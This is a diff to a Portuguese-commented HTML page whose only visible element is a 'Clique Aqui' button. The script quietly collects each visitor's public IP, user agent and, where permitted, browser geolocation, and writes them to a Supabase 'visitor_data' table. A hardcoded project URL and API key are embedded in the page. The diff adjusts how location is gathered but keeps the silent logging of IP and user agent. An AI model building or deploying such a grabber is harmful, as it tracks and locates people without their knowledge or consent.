@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Site</title>
-    <!-- Carrega a versão mais recente do Supabase JS -->
+    <title>Site v1</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
     <style>
         body {
@@ -13,7 +12,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            transition: background-color 0.5s;
+            background-color: #000; /* Fundo fixo preto */
         }
         button {
             padding: 15px 30px;
@@ -33,28 +32,17 @@
     <button id="triggerButton">Clique Aqui</button>
 
     <script>
-        // Muda a cor do fundo aleatoriamente ao carregar
-        function getRandomColor() {
-            const letters = '0123456789ABCDEF';
-            let color = '#';
-            for (let i = 0; i < 6; i++) {
-                color += letters[Math.floor(Math.random() * 16)];
-            }
-            return color;
-        }
-        document.body.style.backgroundColor = getRandomColor();
-
-        // Verifica se o Supabase foi carregado
-        if (typeof supabase === 'undefined') {
-            console.error('Erro: Biblioteca Supabase não foi carregada. Verifique o script CDN.');
-        } else {
-            console.log('Biblioteca Supabase carregada com sucesso.');
-        }
-
         // Configuração do Supabase
         const SUPABASE_URL = 'https://bsbipbftwrwjiepxmbb.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzYmlwYmZ0d3Jyd2ppZXB4bWJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDM4NzczNzQsImV4cCI6MjA1OTQ1MzM3NH0.NB9LBMjPZXF2Z7L78S9-3WhrIKeRyfNvJ-hgVLIKd7g';
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        // Verifica se o Supabase foi carregado
+        if (typeof supabase === 'undefined') {
+            console.error('Erro: Biblioteca Supabase não foi carregada.');
+        } else {
+            console.log('Biblioteca Supabase carregada com sucesso.');
+        }
 
         // Teste básico de conexão com Supabase
         async function testSupabaseConnection() {
@@ -62,12 +50,14 @@
                 const { data, error } = await supabaseClient.from('visitor_data').select('*').limit(1);
                 if (error) throw error;
                 console.log('Conexão com Supabase OK:', data);
+                return true;
             } catch (error) {
                 console.error('Erro na conexão com Supabase:', error.message);
+                return false;
             }
         }
 
-        // Função para obter IP
+        // Função para obter IP público
         async function getIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -80,7 +70,7 @@
             }
         }
 
-        // Função para obter localização
+        // Função para obter localização (apenas se autorizado)
         async function getLocation() {
             try {
                 const geo = await new Promise((resolve) => {
@@ -93,41 +83,61 @@
                 if (geo) {
                     console.log('Localização capturada:', geo);
                     return geo;
+                } else {
+                    console.log('Localização não autorizada.');
+                    return null;
                 }
-                const ipGeo = await fetch('https://ipapi.co/json/').then(res => res.json());
-                console.log('Localização por IP:', ipGeo);
-                return { lat: ipGeo.latitude, lon: ipGeo.longitude };
             } catch (e) {
                 console.error('Erro na localização:', e);
-                return { lat: null, lon: null };
+                return null;
             }
         }
 
         // Função para capturar e enviar dados
         async function captureAndSendData() {
             console.log('Iniciando captura de dados...');
-            await testSupabaseConnection(); // Verifica conexão
 
+            // Passo 1: Enviar IP e user agent imediatamente
             const ip = await getIP();
-            const location = await getLocation();
             const userAgent = navigator.userAgent;
 
-            const data = {
+            const initialData = {
                 ip: ip,
-                latitude: location.lat,
-                longitude: location.lon,
+                latitude: null, // Inicialmente null
+                longitude: null, // Inicialmente null
                 user_agent: userAgent
             };
 
-            console.log('Dados a serem enviados:', data);
+            console.log('Dados iniciais a serem enviados:', initialData);
 
             try {
                 const { data: responseData, error } = await supabaseClient
                     .from('visitor_data')
-                    .insert([data])
+                    .insert([initialData])
                     .select();
                 if (error) throw error;
-                console.log('Dados enviados com sucesso:', responseData);
+                console.log('IP e user agent enviados com sucesso:', responseData);
+
+                // Passo 2: Se o envio inicial funcionar, tenta a localização
+                const connectionOk = await testSupabaseConnection();
+                if (connectionOk) {
+                    const location = await getLocation();
+                    if (location) {
+                        const updatedData = {
+                            ip: ip,
+                            latitude: location.lat,
+                            longitude: location.lon,
+                            user_agent: userAgent
+                        };
+                        console.log('Dados com localização a serem enviados:', updatedData);
+                        const { data: locationResponse, error: locationError } = await supabaseClient
+                            .from('visitor_data')
+                            .insert([updatedData])
+                            .select();
+                        if (locationError) throw locationError;
+                        console.log('Localização enviada com sucesso:', locationResponse);
+                    }
+                }
             } catch (error) {
                 console.error('Erro ao enviar para Supabase:', error.message, error.details);
             }
